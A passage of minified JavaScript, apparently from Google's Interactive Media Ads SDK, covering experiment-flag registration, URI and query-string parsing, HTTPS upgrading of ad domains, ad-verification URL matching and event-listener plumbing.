    1 == b.length && 16 == L(J(b[0], 1), 0) && fc(b[0], Sd).forEach(function (c) {
      var d = hc(c),
        e = dc(c, Md, 3),
        f = a[L(J(c, 4), 0)];
      fc(c, Rd).forEach(function (g) {
        var h = d || gc(g, 4),
          k = g.getId(),
          m = e || dc(g, Md, 3);
        m = m ? ic(m, 3, Nd) : null;
        m = Yd[m];
        g = be(fc(g, Pd));
        U({
          id: k,
          h: h,
          m: f,
          ja: m,
          flags: g
        });
      });
    });
  }
  function be(a) {
    if (a.length) {
      var b = {};
      a.forEach(function (c) {
        var d = c.u;
        d = cc(d, H(d), Qd);
        var e = dc(c, Od, 4);
        e && (c = Vd(c, d), d = Wd(e, d), b[c] = d);
      });
      return b;
    }
  }
  ;
  var ce = function (a) {
    this.i = a;
  };
  ce.prototype.g = function (a, b) {
    a = t(this.i);
    for (var c = a.next(); !c.done; c = a.next()) if (c = b.get(c.value)) c.g = !0, Fd(c);
  };
  var de = function (a, b) {
    this.i = a;
    this.j = b;
  };
  w(de, ce);
  de.prototype.g = function (a, b) {
    ce.prototype.g.call(this, a, b);
    var c = [];
    a = [];
    for (var d = t(this.i), e = d.next(); !e.done; e = d.next()) e = e.value, b.get(e) ? c.push(e) : a.push(e);
    b = c.map(String).join(",") || "0";
    a = a.map(String).join(",") || "0";
    S(Q(R), "sei", b);
    S(Q(R), "nsei", a);
    S(Q(R), "bi", this.j);
  };
  var ee = function () {
    zd.apply(this, arguments);
  };
  w(ee, zd);
  var Ad = function (a, b) {
    var c = Q(R);
    S(c, "eee", a);
    S(c, "bi", b);
  };
  function fe() {
    return ge.split(",").map(function (a) {
      return parseInt(a, 10);
    }).filter(function (a) {
      return !isNaN(a);
    });
  }
  ;
  var he = new T(),
    ie = new T(),
    je = new T(),
    ke = new T(),
    le = new T(),
    me = new T(),
    ne = new T(),
    oe = new T(),
    pe = new T(),
    qe = new T(),
    re = new T(),
    se = new T(),
    te = new T(),
    ue = new T(),
    ve = new T(),
    we = new T(),
    xe = new T(),
    ye = new T(),
    ze = new T(),
    Ae = new T(),
    Be = new T();
  U({
    id: 457864198,
    h: 0
  });
  U({
    id: 457864188,
    h: 0
  });
  U({
    id: 45786216,
    h: 10
  });
  U({
    id: 318475490,
    h: 0
  });
  U({
    id: 324123032,
    h: 0
  });
  U({
    id: 418572103,
    h: 0
  });
  U({
    id: 420706097,
    h: 10
  });
  U({
    id: 420706098,
    h: 10
  });
  U({
    id: 21062100,
    h: 0
  });
  U({
    id: 420706105,
    h: 0
  });
  U({
    id: 420706106,
    h: 0
  });
  U({
    id: 21064018,
    h: 0
  });
  U({
    id: 21064020,
    h: 0
  });
  U({
    id: 21064022,
    h: 0
  });
  U({
    id: 21064024,
    h: 0
  });
  U({
    id: 21064075,
    h: 0
  });
  U({
    id: 21064201,
    h: 0
  });
  U({
    id: 420706142,
    h: 0
  });
  U({
    id: 21064347,
    h: 0
  });
  U({
    id: 44745813,
    h: 0
  });
  U({
    id: 44746068,
    h: 0
  });
  U({
    id: 21064565,
    h: 0
  });
  U({
    id: 21064567,
    h: 0
  });
  U({
    id: 418572006,
    h: 10
  });
  U({
    id: 44768716,
    h: 10,
    m: re
  });
  U({
    id: 44768717,
    h: 10,
    m: re
  });
  U({
    id: 44787137,
    h: 0,
    m: re
  });
  U({
    id: 44744588,
    h: 10
  });
  U({
    id: 44747319,
    h: 10
  });
  U({
    id: 44740339,
    h: 10
  });
  U({
    id: 44740340,
    h: 10
  });
  U({
    id: 44749839,
    h: 0
  });
  U({
    id: 44749840,
    h: 0
  });
  U({
    id: 44749841,
    h: 0
  });
  U({
    id: 44749842,
    h: 0
  });
  U({
    id: 44749843,
    h: 1
  });
  U({
    id: 44749844,
    h: 1
  });
  U({
    id: 44749845,
    h: 1
  });
  U({
    id: 44749846,
    h: 1
  });
  U({
    id: 44714743,
    h: 0
  });
  U({
    id: 44719216,
    h: 0
  });
  U({
    id: 44730895,
    h: 10
  });
  U({
    id: 44730896,
    h: 10
  });
  U({
    id: 44736292,
    h: 10
  });
  U({
    id: 44736293,
    h: 10
  });
  U({
    id: 44772138,
    h: 0,
    m: le
  });
  U({
    id: 44772139,
    m: le,
    h: 1E3
  });
  U({
    id: 31061774,
    h: 10
  });
  U({
    id: 31061775,
    h: 10
  });
  U({
    id: 44715336,
    h: 10
  });
  U({
    id: 75259410,
    h: 0
  });
  U({
    id: 75259412,
    h: 0
  });
  U({
    id: 75259413,
    h: 0
  });
  U({
    id: 44773378,
    h: 10,
    m: je
  });
  U({
    id: 44773379,
    h: 10,
    m: je
  });
  U({
    id: 44724516,
    h: 0
  });
  U({
    id: 44726389,
    h: 10
  });
  U({
    id: 44752711,
    h: 50
  });
  U({
    id: 44752052,
    h: 50
  });
  U({
    id: 44752657,
    h: 50
  });
  U({
    id: 44781407,
    m: ke,
    h: 0
  });
  U({
    id: 44781408,
    m: ke,
    h: 0
  });
  U({
    id: 44781409,
    m: ke,
    h: 1E3
  });
  U({
    id: 44777647,
    m: me,
    h: 0
  });
  U({
    id: 44777648,
    m: me,
    h: 0
  });
  U({
    id: 44777649,
    m: me,
    h: 1E3
  });
  U({
    id: 44727953,
    h: 0
  });
  U({
    id: 44782089,
    m: ne,
    h: 10
  });
  U({
    id: 44782090,
    m: ne,
    h: 10
  });
  U({
    id: 44733246,
    h: 10
  });
  U({
    id: 44750823,
    h: 10,
    m: pe
  });
  U({
    id: 44750824,
    h: 10,
    m: pe
  });
  U({
    id: 44794282,
    h: 10,
    m: pe
  });
  U({
    id: 44797013,
    h: 10,
    m: pe
  });
  U({
    id: 44797014,
    h: 10,
    m: pe
  });
  U({
    id: 44750822,
    h: 10,
    m: pe
  });
  U({
    id: 44737473,
    h: 0,
    m: ie
  });
  U({
    id: 44771450,
    h: 0,
    m: ie
  });
  U({
    id: 44751889,
    h: 10
  });
  U({
    id: 44751890,
    h: 10
  });
  U({
    id: 44752995,
    h: 10
  });
  U({
    id: 44752996,
    h: 10
  });
  U({
    id: 44762627,
    h: 0
  });
  U({
    id: 44762628,
    h: 0
  });
  U({
    id: 44801479,
    h: 10,
    m: qe
  });
  U({
    id: 44801480,
    h: 10,
    m: qe
  });
  U({
    id: 44752538,
    h: 0
  });
  U({
    id: 44754608,
    h: 10
  });
  U({
    id: 44754609,
    h: 10
  });
  U({
    id: 44770822,
    h: 10
  });
  U({
    id: 44770823,
    h: 10
  });
  U({
    id: 44770824,
    h: 10
  });
  U({
    id: 44770825,
    h: 10
  });
  U({
    id: 75259414,
    h: 0
  });
  U({
    id: 44731964,
    h: 50,
    m: he
  });
  U({
    id: 44731965,
    h: 50,
    m: he
  });
  U({
    id: 44767584,
    h: 0
  });
  var Ce,
    De = (null == (Ce = window.document.featurePolicy) ? 0 : Ce.allowedFeatures().includes("attribution-reporting")) ? 300 : 0;
  U({
    id: 44776494,
    h: De,
    m: se
  });
  U({
    id: 44776495,
    h: De,
    m: se
  });
  var Ee,
    Fe = (null == (Ee = window.document.featurePolicy) || Ee.allowedFeatures().includes("attribution-reporting"), 0);
  U({
    id: 44769484,
    h: Fe,
    m: te
  });
  U({
    id: 44769485,
    h: Fe,
    m: te
  });
  U({
    id: 44776384,
    h: 0
  });
  U({
    id: 44804616,
    h: 50,
    m: we
  });
  U({
    id: 44804617,
    h: 50,
    m: we
  });
  U({
    id: 44804618,
    h: 50,
    m: we
  });
  U({
    id: 44804613,
    h: 50,
    m: xe
  });
  U({
    id: 44804614,
    h: 50,
    m: xe
  });
  U({
    id: 44804615,
    h: 50,
    m: xe
  });
  U({
    id: 44803783,
    h: 50
  });
  U({
    id: 44803784,
    h: 50
  });
  U({
    id: 44803785,
    h: 50
  });
  U({
    id: 44787954,
    h: 0
  });
  U({
    id: 44789282,
    h: 0
  });
  U({
    id: 44792636,
    h: 0
  });
  U({
    id: 44794298,
    h: 0
  });
  U({
    id: 44803996,
    h: 0
  });
  U({
    id: 44805453,
    h: 0
  });
  U({
    id: 44804917,
    h: 0
  });
  U({
    id: 75259415,
    h: 0
  });
  U({
    id: 75259416,
    h: 0
  });
  U({
    id: 75259420,
    h: 0
  });
  U({
    id: 44785452,
    h: 10
  });
  U({
    id: 44785453,
    h: 10
  });
  U({
    id: 45401791,
    h: 0
  });
  U({
    id: 44795414,
    h: 1,
    m: ue
  });
  U({
    id: 44795415,
    h: 1,
    m: ue
  });
  U({
    id: 44795416,
    h: 1,
    m: ue
  });
  U({
    id: 44795417,
    h: 1,
    m: ue
  });
  U({
    id: 44805102,
    h: 5,
    m: ye
  });
  U({
    id: 44805103,
    h: 5,
    m: ye
  });
  U({
    id: 44805104,
    h: 5,
    m: ye
  });
  U({
    id: 44805105,
    h: 5,
    m: ye
  });
  U({
    id: 44805106,
    h: 5,
    m: ye
  });
  U({
    id: 44806631,
    h: 50,
    m: ze
  });
  U({
    id: 44806632,
    h: 50,
    m: ze
  });
  U({
    id: 44802172,
    h: 10
  });
  U({
    id: 44802173,
    h: 10
  });
  U({
    id: 44804291,
    h: 1E3,
    m: Be
  });
  U({
    id: 44802073,
    h: 0,
    m: Ae
  });
  U({
    id: 44802074,
    h: 1E3,
    m: Ae
  });
  U({
    id: 44802401,
    h: 0
  });
  U({
    id: 44802402,
    h: 0
  });
  U({
    id: 44802463,
    h: 1E3,
    m: ve
  });
  U({
    id: 44805638,
    h: 10
  });
  U({
    id: 44805639,
    h: 10
  });
  U({
    id: 44805640,
    h: 10
  });
  U({
    id: 44806074,
    h: 50
  });
  U({
    id: 44806075,
    h: 50
  });
  U({
    id: 44806732,
    h: 10
  });
  U({
    id: 44806733,
    h: 10
  });
  U({
    id: 44807118,
    h: 10
  });
  U({
    id: 44807119,
    h: 10
  });
  U({
    id: 44807186,
    h: 10
  });
  U({
    id: 44807187,
    h: 10
  });
  U({
    id: 44807947,
    h: 50
  });
  U({
    id: 44807948,
    h: 50
  });
  U({
    id: 44807614,
    h: 10
  });
  U({
    id: 44807615,
    h: 10
  });
  U({
    id: 44808024,
    h: 10
  });
  U({
    id: 44808025,
    h: 10
  });
  U({
    id: 44808026,
    h: 10
  });
  var Ge = {},
    $d = (Ge[32] = he, Ge[35] = oe, Ge);
  $d = void 0 === $d ? {} : $d;
  if (!/^\{+IMA_EXPERIMENT_STATE_JSPB\}+$/.test("{{IMA_EXPERIMENT_STATE_JSPB}}")) try {
    var ae = JSON.parse("{{IMA_EXPERIMENT_STATE_JSPB}}");
    ae instanceof Array && Zd();
  } catch (a) {
    S(Q(R), "espe", a.message);
  }
  if ("undefined" === typeof window.v8_flag_map) {
    var Dd = Q(ee);
    Dd.i || (Ed(), Dd.i = !0);
    var ge = Dd.j,
      He;
    Dd.i || (Ed(), Dd.i = !0);
    He = Dd.g;
    if (null != ge) {
      var Ie = new de(fe(), He);
      Kd(Ie);
    }
  }
  ;
  Id.reset();
  Kd(new Ld());
  function Je() {
    var a = Ka();
    return Ha(a, "AppleTV") || Ha(a, "Apple TV") || Ha(a, "CFNetwork") || Ha(a, "tvOS");
  }
  ;
  var Ke = function (a) {
    this.i = this.A = this.l = "";
    this.s = null;
    this.o = this.j = "";
    this.v = !1;
    var b;
    a instanceof Ke ? (this.v = a.v, Le(this, a.l), this.A = a.A, this.i = a.i, Me(this, a.s), this.j = a.j, Ne(this, Oe(a.g)), this.o = a.o) : a && (b = String(a).match(Gc)) ? (this.v = !1, Le(this, b[1] || "", !0), this.A = Pe(b[2] || ""), this.i = Pe(b[3] || "", !0), Me(this, b[4]), this.j = Pe(b[5] || "", !0), Ne(this, b[6] || "", !0), this.o = Pe(b[7] || "")) : (this.v = !1, this.g = new V(null, this.v));
  };
  Ke.prototype.toString = function () {
    var a = [],
      b = this.l;
    b && a.push(Qe(b, Re, !0), ":");
    var c = this.i;
    if (c || "file" == b) a.push("//"), (b = this.A) && a.push(Qe(b, Re, !0), "@"), a.push(encodeURIComponent(String(c)).replace(/%25([0-9a-fA-F]{2})/g, "%$1")), c = this.s, null != c && a.push(":", String(c));
    if (c = this.j) this.i && "/" != c.charAt(0) && a.push("/"), a.push(Qe(c, "/" == c.charAt(0) ? Se : Te, !0));
    (c = this.g.toString()) && a.push("?", c);
    (c = this.o) && a.push("#", Qe(c, Ue));
    return a.join("");
  };
  Ke.prototype.resolve = function (a) {
    var b = new Ke(this),
      c = !!a.l;
    c ? Le(b, a.l) : c = !!a.A;
    c ? b.A = a.A : c = !!a.i;
    c ? b.i = a.i : c = null != a.s;
    var d = a.j;
    if (c) Me(b, a.s);else if (c = !!a.j) {
      if ("/" != d.charAt(0)) if (this.i && !this.j) d = "/" + d;else {
        var e = b.j.lastIndexOf("/");
        -1 != e && (d = b.j.slice(0, e + 1) + d);
      }
      e = d;
      if (".." == e || "." == e) d = "";else if (-1 != e.indexOf("./") || -1 != e.indexOf("/.")) {
        d = 0 == e.lastIndexOf("/", 0);
        e = e.split("/");
        for (var f = [], g = 0; g < e.length;) {
          var h = e[g++];
          "." == h ? d && g == e.length && f.push("") : ".." == h ? ((1 < f.length || 1 == f.length && "" != f[0]) && f.pop(), d && g == e.length && f.push("")) : (f.push(h), d = !0);
        }
        d = f.join("/");
      } else d = e;
    }
    c ? b.j = d : c = "" !== a.g.toString();
    c ? Ne(b, Oe(a.g)) : c = !!a.o;
    c && (b.o = a.o);
    return b;
  };
  var Le = function (a, b, c) {
      a.l = c ? Pe(b, !0) : b;
      a.l && (a.l = a.l.replace(/:$/, ""));
    },
    Me = function (a, b) {
      if (b) {
        b = Number(b);
        if (isNaN(b) || 0 > b) throw Error("Bad port number " + b);
        a.s = b;
      } else a.s = null;
    },
    Ne = function (a, b, c) {
      b instanceof V ? (a.g = b, Ve(a.g, a.v)) : (c || (b = Qe(b, We)), a.g = new V(b, a.v));
    },
    Pe = function (a, b) {
      return a ? b ? decodeURI(a.replace(/%25/g, "%2525")) : decodeURIComponent(a) : "";
    },
    Qe = function (a, b, c) {
      return "string" === typeof a ? (a = encodeURI(a).replace(b, Xe), c && (a = a.replace(/%25([0-9a-fA-F]{2})/g, "%$1")), a) : null;
    },
    Xe = function (a) {
      a = a.charCodeAt(0);
      return "%" + (a >> 4 & 15).toString(16) + (a & 15).toString(16);
    },
    Re = /[#\/\?@]/g,
    Te = /[#\?:]/g,
    Se = /[#\?]/g,
    We = /[#\?@]/g,
    Ue = /#/g,
    V = function (a, b) {
      this.i = this.g = null;
      this.j = a || null;
      this.l = !!b;
    },
    Ye = function (a) {
      a.g || (a.g = new Map(), a.i = 0, a.j && Hc(a.j, function (b, c) {
        a.add(decodeURIComponent(b.replace(/\+/g, " ")), c);
      }));
    };
  V.prototype.add = function (a, b) {
    Ye(this);
    this.j = null;
    a = Ze(this, a);
    var c = this.g.get(a);
    c || this.g.set(a, c = []);
    c.push(b);
    this.i += 1;
    return this;
  };
  var $e = function (a, b) {
    Ye(a);
    b = Ze(a, b);
    a.g.has(b) && (a.j = null, a.i -= a.g.get(b).length, a.g.delete(b));
  };
  V.prototype.clear = function () {
    this.g = this.j = null;
    this.i = 0;
  };
  V.prototype.isEmpty = function () {
    Ye(this);
    return 0 == this.i;
  };
  var af = function (a, b) {
    Ye(a);
    b = Ze(a, b);
    return a.g.has(b);
  };
  V.prototype.forEach = function (a, b) {
    Ye(this);
    this.g.forEach(function (c, d) {
      c.forEach(function (e) {
        a.call(b, e, d, this);
      }, this);
    }, this);
  };
  var bf = function (a, b) {
    Ye(a);
    var c = [];
    if ("string" === typeof b) af(a, b) && (c = c.concat(a.g.get(Ze(a, b))));else for (a = Array.from(a.g.values()), b = 0; b < a.length; b++) c = c.concat(a[b]);
    return c;
  };
  V.prototype.set = function (a, b) {
    Ye(this);
    this.j = null;
    a = Ze(this, a);
    af(this, a) && (this.i -= this.g.get(a).length);
    this.g.set(a, [b]);
    this.i += 1;
    return this;
  };
  V.prototype.get = function (a, b) {
    if (!a) return b;
    a = bf(this, a);
    return 0 < a.length ? String(a[0]) : b;
  };
  V.prototype.toString = function () {
    if (this.j) return this.j;
    if (!this.g) return "";
    for (var a = [], b = Array.from(this.g.keys()), c = 0; c < b.length; c++) {
      var d = b[c],
        e = encodeURIComponent(String(d));
      d = bf(this, d);
      for (var f = 0; f < d.length; f++) {
        var g = e;
        "" !== d[f] && (g += "=" + encodeURIComponent(String(d[f])));
        a.push(g);
      }
    }
    return this.j = a.join("&");
  };
  var Oe = function (a) {
      var b = new V();
      b.j = a.j;
      a.g && (b.g = new Map(a.g), b.i = a.i);
      return b;
    },
    Ze = function (a, b) {
      b = String(b);
      a.l && (b = b.toLowerCase());
      return b;
    },
    Ve = function (a, b) {
      b && !a.l && (Ye(a), a.j = null, a.g.forEach(function (c, d) {
        var e = d.toLowerCase();
        if (d != e && ($e(this, d), $e(this, e), 0 < c.length)) {
          this.j = null;
          d = this.g;
          var f = d.set;
          e = Ze(this, e);
          var g = c.length;
          if (0 < g) {
            for (var h = Array(g), k = 0; k < g; k++) h[k] = c[k];
            g = h;
          } else g = [];
          f.call(d, e, g);
          this.i += c.length;
        }
      }, a));
      a.l = b;
    };
  var cf = "ad.doubleclick.net bid.g.doubleclick.net ggpht.com google.co.uk google.com googleads.g.doubleclick.net googleads4.g.doubleclick.net googleadservices.com googlesyndication.com googleusercontent.com gstatic.com gvt1.com prod.google.com pubads.g.doubleclick.net s0.2mdn.net static.doubleclick.net surveys.g.doubleclick.net youtube.com ytimg.com".split(" "),
    df = ["c.googlesyndication.com"];
  function ef(a, b) {
    b = void 0 === b ? window.location.protocol : b;
    var c = !1;
    null == a || !a.startsWith("http") || (null == a ? 0 : a.startsWith("https")) ? c = !1 : ff(a, df) ? c = !1 : b.includes("https") && ff(a, cf) && (c = !0);
    return c ? (a = new Ke(a), S(Q(R), "htp", "1"), Le(a, "https"), a.toString()) : a;
  }
  function ff(a, b) {
    return new RegExp("^https?://([a-z0-9-]{1,63}\\.)*(" + b.join("|").replace(/\./g, "\\.") + ")(:[0-9]+)?([/?#]|$)", "i").test(a);
  }
  ;
  var gf = "://secure-...imrworldwide.com/ ://cdn.imrworldwide.com/ ://aksecure.imrworldwide.com/ ://[^.]*.moatads.com ://youtube[0-9]+.moatpixel.com ://pm.adsafeprotected.com/youtube ://pm.test-adsafeprotected.com/youtube ://e[0-9]+.yt.srs.doubleverify.com www.google.com/pagead/xsul www.youtube.com/pagead/slav".split(" "),
    hf = /\bocr\b/;
  function jf(a) {
    if (/^[\s\xa0]*$/.test(null == a ? "" : String(a)) || A && 2048 < a.length) return !1;
    try {
      if (new Ke(a).o.match(hf)) return !0;
    } catch (b) {}
    return null != gf.find(function (b) {
      return null != a.match(b);
    });
  }
  ;
  function kf(a) {
    var b = [""];
    if (!a) return null;
    a = a.toLowerCase().replace("-", "_");
    if (b.includes(a)) return a;
    a = (a = a.match(/^\w{2,3}([-_]|$)/)) ? a[0].replace(/[_-]/g, "") : "";
    return b.includes(a) ? a : null;
  }
  ;
  var lf = function () {
    this.g = Date.now();
  };
  lf.prototype.reset = function () {
    this.g = Date.now();
  };
  var mf = function (a) {
    a = a.g + 5E3 - Date.now();
    return 0 < a ? a : 0;
  };
  var nf = function (a, b) {
    this.url = a;
    this.g = void 0 === b ? null : b;
  };
  var of = function (a) {
    a = Error.call(this, a);
    this.message = a.message;
    "stack" in a && (this.stack = a.stack);
  };
  w(of, Error);
  var pf = function () {
      if (!A) return !1;
      try {
        return new ActiveXObject("MSXML2.DOMDocument"), !0;
      } catch (a) {
        return !1;
      }
    },
    qf = A && pf();
  function rf(a) {
    a && "function" == typeof a.T && a.T();
  }
  ;
  var sf = function () {
    this.A = this.A;
    this.v = this.v;
  };
  sf.prototype.A = !1;
  sf.prototype.T = function () {
    this.A || (this.A = !0, this.i());
  };
  var tf = function (a, b) {
    a.A ? b() : (a.v || (a.v = []), a.v.push(b));
  };
  sf.prototype.i = function () {
    if (this.v) for (; this.v.length;) this.v.shift()();
  };
  var W = function (a, b) {
    this.type = a;
    this.currentTarget = this.target = b;
    this.defaultPrevented = this.i = !1;
  };
  W.prototype.stopPropagation = function () {
    this.i = !0;
  };
  W.prototype.preventDefault = function () {
    this.defaultPrevented = !0;
  };
  var uf = function () {
    if (!x.addEventListener || !Object.defineProperty) return !1;
    var a = !1,
      b = Object.defineProperty({}, "passive", {
        get: function () {
          a = !0;
        }
      });
    try {
      var c = function () {};
      x.addEventListener("test", c, b);
      x.removeEventListener("test", c, b);
    } catch (d) {}
    return a;
  }();
  var vf = function (a, b) {
    W.call(this, a ? a.type : "");
    this.relatedTarget = this.currentTarget = this.target = null;
    this.button = this.screenY = this.screenX = this.clientY = this.clientX = 0;
    this.key = "";
    this.metaKey = this.shiftKey = this.altKey = this.ctrlKey = !1;
    this.state = null;
    this.pointerId = 0;
    this.pointerType = "";
    this.g = null;
    a && this.init(a, b);
  };
  Ea(vf, W);
  var wf = {
    2: "touch",
    3: "pen",
    4: "mouse"
  };
  vf.prototype.init = function (a, b) {
    var c = this.type = a.type,
      d = a.changedTouches && a.changedTouches.length ? a.changedTouches[0] : null;
    this.target = a.target || a.srcElement;
    this.currentTarget = b;
    (b = a.relatedTarget) ? Za && (Wa(b, "nodeName") || (b = null)) : "mouseover" == c ? b = a.fromElement : "mouseout" == c && (b = a.toElement);
    this.relatedTarget = b;
    d ? (this.clientX = void 0 !== d.clientX ? d.clientX : d.pageX, this.clientY = void 0 !== d.clientY ? d.clientY : d.pageY, this.screenX = d.screenX || 0, this.screenY = d.screenY || 0) : (this.clientX = void 0 !== a.clientX ? a.clientX : a.pageX, this.clientY = void 0 !== a.clientY ? a.clientY : a.pageY, this.screenX = a.screenX || 0, this.screenY = a.screenY || 0);
    this.button = a.button;
    this.key = a.key || "";
    this.ctrlKey = a.ctrlKey;
    this.altKey = a.altKey;
    this.shiftKey = a.shiftKey;
    this.metaKey = a.metaKey;
    this.pointerId = a.pointerId || 0;
    this.pointerType = "string" === typeof a.pointerType ? a.pointerType : wf[a.pointerType] || "";
    this.state = a.state;
    this.g = a;
    a.defaultPrevented && vf.N.preventDefault.call(this);
  };
  vf.prototype.stopPropagation = function () {
    vf.N.stopPropagation.call(this);
    this.g.stopPropagation ? this.g.stopPropagation() : this.g.cancelBubble = !0;
  };
  vf.prototype.preventDefault = function () {
    vf.N.preventDefault.call(this);
    var a = this.g;
    a.preventDefault ? a.preventDefault() : a.returnValue = !1;
  };
  var xf = "closure_listenable_" + (1E6 * Math.random() | 0);
  var yf = 0;
  var zf = function (a, b, c, d, e) {
      this.listener = a;
      this.proxy = null;
      this.src = b;
      this.type = c;
      this.capture = !!d;
      this.ba = e;
      this.key = ++yf;
      this.V = this.Z = !1;
    },
    Af = function (a) {
      a.V = !0;
      a.listener = null;
      a.proxy = null;
      a.src = null;
      a.ba = null;
    };
  var Bf = function (a) {
    this.src = a;
    this.g = {};
    this.i = 0;
  };
  Bf.prototype.add = function (a, b, c, d, e) {
    var f = a.toString();
    a = this.g[f];
    a || (a = this.g[f] = [], this.i++);
    var g = Cf(a, b, d, e);
    -1 < g ? (b = a[g], c || (b.Z = !1)) : (b = new zf(b, this.src, f, !!d, e), b.Z = c, a.push(b));
    return b;
  };
  var Df = function (a, b) {
      var c = b.type;
      if (c in a.g) {
        var d = a.g[c],
          e = Qa(d, b),
          f;
        (f = 0 <= e) && Array.prototype.splice.call(d, e, 1);
        f && (Af(b), 0 == a.g[c].length && (delete a.g[c], a.i--));
      }
    },
    Cf = function (a, b, c, d) {
      for (var e = 0; e < a.length; ++e) {
        var f = a[e];
        if (!f.V && f.listener == b && f.capture == !!c && f.ba == d) return e;
      }
      return -1;
    };
  var Ef = "closure_lm_" + (1E6 * Math.random() | 0),
    Ff = {},
    Gf = 0,
    If = function (a, b, c, d, e) {
      if (d && d.once) return Hf(a, b, c, d, e);
      if (Array.isArray(b)) {
        for (var f = 0; f < b.length; f++) If(a, b[f], c, d, e);
        return null;
      }
      c = Jf(c);
      return a && a[xf] ? a.l.add(String(b), c, !1, ya(d) ? !!d.capture : !!d, e) : Kf(a, b, c, !1, d, e);
    },
    Kf = function (a, b, c, d, e, f) {
      if (!b) throw Error("Invalid event type");
      var g = ya(e) ? !!e.capture : !!e,
        h = Lf(a);
      h || (a[Ef] = h = new Bf(a));
      c = h.add(b, c, d, g, f);
      if (c.proxy) return c;
      d = Mf();
      c.proxy = d;
      d.src = a;
      d.listener = c;
      if (a.addEventListener) uf || (e = g), void 0 === e && (e = !1), a.addEventListener(b.toString(), d, e);else if (a.attachEvent) a.attachEvent(Nf(b.toString()), d);else if (a.addListener && a.removeListener) a.addListener(d);else throw Error("addEventListener and attachEvent are unavailable.");
      Gf++;
      return c;
    },
    Mf = function () {
      var a = Of,
        b = function (c) {
          return a.call(b.src, b.listener, c);
        };
      return b;
    },
    Hf = function (a, b, c, d, e) {
      if (Array.isArray(b)) {
        for (var f = 0; f < b.length; f++) Hf(a, b[f], c, d, e);
        return null;
      }
      c = Jf(c);
      return a && a[xf] ? a.l.add(String(b), c, !0, ya(d) ? !!d.capture : !!d, e) : Kf(a, b, c, !0, d, e);
    },
    Pf = function (a, b, c, d, e) {
      if (Array.isArray(b)) for (var f = 0; f < b.length; f++) Pf(a, b[f], c, d, e);else (d = ya(d) ? !!d.capture : !!d, c = Jf(c), a && a[xf]) ? (a = a.l, b = String(b).toString(), b in a.g && (f = a.g[b], c = Cf(f, c, d, e), -1 < c && (Af(f[c]), Array.prototype.splice.call(f, c, 1), 0 == f.length && (delete a.g[b], a.i--)))) : a && (a = Lf(a)) && (b = a.g[b.toString()], a = -1, b && (a = Cf(b, c, d, e)), (c = -1 < a ? b[a] : null) && Qf(c));
    },
    Qf = function (a) {
      if ("number" !== typeof a && a && !a.V) {
        var b = a.src;
        if (b && b[xf]) Df(b.l, a);else {
          var c = a.type,
            d = a.proxy;
          b.removeEventListener ? b.removeEventListener(c, d, a.capture) : b.detachEvent ? b.detachEvent(Nf(c), d) : b.addListener && b.removeListener && b.removeListener(d);
          Gf--;
          (c = Lf(b)) ? (Df(c, a), 0 == c.i && (c.src = null, b[Ef] = null)) : Af(a);
        }
      }
    },
    Nf = function (a) {
      return a in Ff ? Ff[a] : Ff[a] = "on" + a;
    },
    Of = function (a, b) {
      if (a.V) a = !0;else {
        b = new vf(b, this);
        var c = a.listener,
          d = a.ba || a.src;
        a.Z && Qf(a);
        a = c.call(d, b);
      }
      return a;
    },
    Lf = function (a) {
      a = a[Ef];
      return a instanceof Bf ? a : null;
    },
    Rf = "__closure_events_fn_" + (1E9 * Math.random() >>> 0),
    Jf = function (a) {
      if ("function" === typeof a) return a;
      a[Rf] || (a[Rf] = function (b) {
        return a.handleEvent(b);
      });
      return a[Rf];
    };
  var Sf = function (a) {
    sf.call(this);
    this.o = a;
    this.j = {};
  };
  Ea(Sf, sf);
  var Tf = [],
    Uf = function (a, b, c, d) {
      Array.isArray(c) || (c && (Tf[0] = c.toString()), c = Tf);
      for (var e = 0; e < c.length; e++) {
        var f = If(b, c[e], d || a.handleEvent, !1, a.o || a);
        if (!f) break;
        a.j[f.key] = f;
      }
    },
    Wf = function (a, b, c, d) {
      Vf(a, b, c, d);
    },
    Vf = function (a, b, c, d, e, f) {
      if (Array.isArray(c)) for (var g = 0; g < c.length; g++) Vf(a, b, c[g], d, e, f);else (b = Hf(b, c, d || a.handleEvent, e, f || a.o || a)) && (a.j[b.key] = b);
    },
    Xf = function (a) {
      oc(a.j, function (b, c) {
        this.j.hasOwnProperty(c) && Qf(b);
      }, a);
      a.j = {};
    };
  Sf.prototype.i = function () {
    Sf.N.i.call(this);
    Xf(this);
  };
  Sf.prototype.handleEvent = function () {
    throw Error("EventHandler.handleEvent not implemented");
  };
  var X = function () {
    sf.call(this);
    this.l = new Bf(this);
    this.ha = this;
    this.P = null;
  };
  Ea(X, sf);
  X.prototype[xf] = !0;
  X.prototype.addEventListener = function (a, b, c, d) {
    If(this, a, b, c, d);
  };
  X.prototype.removeEventListener = function (a, b, c, d) {
    Pf(this, a, b, c, d);
  };
  var Y = function (a, b) {
    var c,
      d = a.P;
    if (d) for (c = []; d; d = d.P) c.push(d);
    a = a.ha;
    d = b.type || b;
    if ("string" === typeof b) b = new W(b, a);else if (b instanceof W) b.target = b.target || a;else {
      var e = b;
      b = new W(d, a);
      rc(b, e);
    }
    e = !0;
    if (c) for (var f = c.length - 1; !b.i && 0 <= f; f--) {
      var g = b.currentTarget = c[f];
      e = Yf(g, d, !0, b) && e;
    }
    b.i || (g = b.currentTarget = a, e = Yf(g, d, !0, b) && e, b.i || (e = Yf(g, d, !1, b) && e));
    if (c) for (f = 0; !b.i && f < c.length; f++) g = b.currentTarget = c[f], e = Yf(g, d, !1, b) && e;
  };
  X.prototype.i = function () {
    X.N.i.call(this);
    if (this.l) {
      var a = this.l,
        b = 0,
        c;
      for (c in a.g) {
        for (var d = a.g[c], e = 0; e < d.length; e++) ++b, Af(d[e]);
        delete a.g[c];
        a.i--;
      }
    }
    this.P = null;
  };
  var Yf = function (a, b, c, d) {
    b = a.l.g[String(b)];
    if (!b) return !0;
    b = b.concat();
    for (var e = !0, f = 0; f < b.length; ++f) {
      var g = b[f];
      if (g && !g.V && g.capture == c) {
        var h = g.listener,
          k = g.ba || g.src;
        g.Z && Df(a.l, g);
        e = !1 !== h.call(k, d) && e;
      }
    }
    return e && !d.defaultPrevented;
  };
  var Zf = function () {};
  Zf.prototype.g = null;
  var ag = function (a) {
    var b;
    (b = a.g) || (b = {}, $f(a) && (b[0] = !0, b[1] = !0), b = a.g = b);
    return b;
  };
  var bg,
    cg = function () {};
  Ea(cg, Zf);
  var dg = function (a) {
      return (a = $f(a)) ? new ActiveXObject(a) : new XMLHttpRequest();
    },
    $f = function (a) {
      if (!a.i && "undefined" == typeof XMLHttpRequest && "undefined" != typeof ActiveXObject) {
